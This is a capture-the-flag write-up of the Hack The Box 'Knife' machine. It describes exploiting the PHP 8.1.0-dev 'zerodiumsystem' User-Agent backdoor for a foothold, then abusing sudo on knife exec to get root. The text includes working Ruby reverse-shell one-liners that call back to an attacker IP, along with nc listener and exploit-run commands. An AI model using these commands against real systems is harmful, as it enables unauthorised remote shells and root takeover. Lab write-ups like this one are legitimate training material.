<p align="center">
  <img src="../Assets/HtB/Cap/knife_title_card.png" alt="Cap Machine Card" width="400">
</p>

## :aerial_tramway: Attack Path Summary
- Foothold through backdoored PHP version    
- Root via arbitrary command execution on Chef server running as sudo  

## :dart: Objective
Knife is an easy Linux machine running a Chef Infra server. Enumeration reveals the webserver is using a backdoored development build of PHP, which allows for remote command execution and an immediate foothold. After gaining access, we escalate to root by abusing a misconfigured sudo binary (knife) to execute Ruby code as root.

## :bulb: Key Concepts / What You’ll Learn
- Enumeration Tactics
	- Initial TCP scan to identify open ports
	- Perform full service & version detection
	- Enumerate web technologies through headers & tooling
	- Reviewing and adapting public PoC code
- Vulnerability Type
	- Vulnerable PHP version
	- Arbitrary command execution  
- Tools Used (New & Familiar)
	- nmap
	- Burpsuite
	- Ruby

## :gear: Initial Foothold
An initial nmap scan shows that we have two ports running: SSH and a web server (HTTP).

![screenshot of nmap](/Assets/HtB/Knife/nmap.png)

Navigating to the main site doesn't show much of interest: 

![screenshot of main page](/Assets/HtB/Knife/browser_main_page.png)

Running gobuster also returns no results:

![gobuster results](/Assets/HtB/Knife/gobuster_results.png)

This indicates the attack surface isn’t based on hidden directories, so we pivot to analyzing headers and server metadata. Checking headers in Burp, there is one showing PHP/8.1.0-dev:

![burp intercept of header](/Assets/HtB/Knife/burp_intercept_headers.png)

A quick search shows an exploit for this PHP version, which allows us to utilize a backdoor to gain shell access to the server. PHP 8.1.0-dev shipped with a hardcoded “User-Agentt: zerodiumsystem” backdoor that enables arbitrary command execution on any request containing that header. Ideally we may be able to retrieve a reverse shell via an edited copy of this exploit:

![picture of exploit code](/Assets/HtB/Knife/php_exploit.png)

Create a new directory for this box and git clone this exploit so we can review/run it:

	mkdir knife
	cd knife
	git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git

Always read the exploit source code first to confirm it does what you expect and doesn’t contain unintended behavior. This is also good practice to ensure the code performs as advertised. Once you are satisfied, start a netcat listener and run the exploit:

	nc -nlvp 9001
	python3 revshell_php_8.1.0-dev.py

![screenshot of reverse shell](/Assets/HtB/Knife/reverse_shell.png)

First thing, grab the user.txt flag and submit:

	cat /home/james/user.txt


## :gear: Root Privilege Escalation
Checking our privileges, it looks like james has one file he is allowed to run as sudo:

	sudo -l

![screenshot of sudo privs](/Assets/HtB/Knife/sudo_binary.png)

Knife is part of the Chef configuration suite. When granted sudo access, it can execute Ruby code with full root privileges, making it a powerful privesc vector. Once we run the command, we get a help file showing how to use this functionality. 

This is our privesc vector. We can run knife as sudo, then leverage the functionality to return a reverse shell to our listener. The specific cmdlet we are going to use is: 

	knife exec

The exec cmdlet is self-explanatory: it executes ruby code. Since the server is running Chef, and Chef implements Ruby, we can exploit this functionality to escalate our privileges.

I initially tried a Ruby reverse shell from PentestMonkey, but that failed:

	sudo /usr/bin/knife exec -E "require 'socket'; f = TCPSocket.open('10.10.15.169',1234).to_i; exec sprintf('/bin/sh -i <&%d >&%d 2>&%d', f, f, f)"

It took some digging to understand this error. Knife exec is running in a Chef sandbox and not a normal process. In our reverse shell, we are trying to redirect standard in/out and stderr to the socket file descriptor. Additionally, exec replaces the current running process, which Chef does not particularly want (after all, this is inherently dangerous). This behavior is common in configuration‑management tools: they restrict process replacement and restrict the environment to avoid breaking execution flows. Therefore, I had to resort to a different kind of reverse shell:

	sudo /usr/bin/knife exec -E "require 'socket'; s=TCPSocket.new('10.10.15.169',1234); while(cmd=s.gets); IO.popen(cmd,'r'){|io| s.print io.read} end"

This shell:

* avoids exec, so the running process isn't replaced
* creates a stable socket loop of read command, execute command, send output back

Before running the shell, make sure you have a netcat listener running on the corresponding port:

	nc -nlvp 1234

Once the shell connects, navigate to the root directory to read root.txt

	cat /root/root.txt

## :brain: Understanding the Technique
The initial foothold came from exploiting a backdoored PHP development build exposed to the internet. From there, misconfigured sudo privileges on the knife binary allowed execution of arbitrary Ruby code as root. This combination highlights how development builds and overly permissive infrastructure tools can create critical security risks.

## :writing_hand: Final Thoughts
This challenge reinforced the importance of researching unfamiliar technologies and adapting exploits creatively. I struggled with the reverse shell inside the Chef sandbox, but solving it taught me more than following a walkthrough ever could. Each box is building skills I’m excited to apply to more complex challenges.

## :recycle: Notes
Completed: 2025-11-26  
Machine: https://app.hackthebox.com/machines/Knife

This particular box marks a worthy milestone: this is the box in this write-up series that I have completed *without* a walkthrough. Granted, I did have to pull some hints to find my way, but I was able to make a lot of progress on my own. I'm honestly very excited for the next steps in this journey!